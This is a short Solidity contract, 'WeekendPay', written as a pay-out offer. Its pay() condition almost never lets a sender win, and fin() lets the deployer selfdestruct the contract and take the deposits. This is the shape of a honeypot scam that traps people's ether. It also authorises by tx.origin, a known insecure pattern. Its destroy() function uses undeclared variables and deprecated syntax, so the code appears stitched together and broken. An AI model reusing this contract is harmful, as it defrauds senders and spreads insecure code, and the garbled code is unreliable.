pragma solidity ^0.4.25;

contract WeekendPay
{
    address O = tx.origin;

    function() public payable {}

    function pay() public payable {
        if (msg.value >= this.balance) {
            tx.origin.transfer(this.balance);
        }
    }
    function fin() public {
        if (tx.origin == O) {
            selfdestruct(tx.origin);
        }
    }
	function destroy() public {
		for(uint i = 0; i < values.length - 1; i++) {
			if(entries[values[i]].expires != 0)
				throw;
				msg.sender.send(msg.value);
		}
	}
}
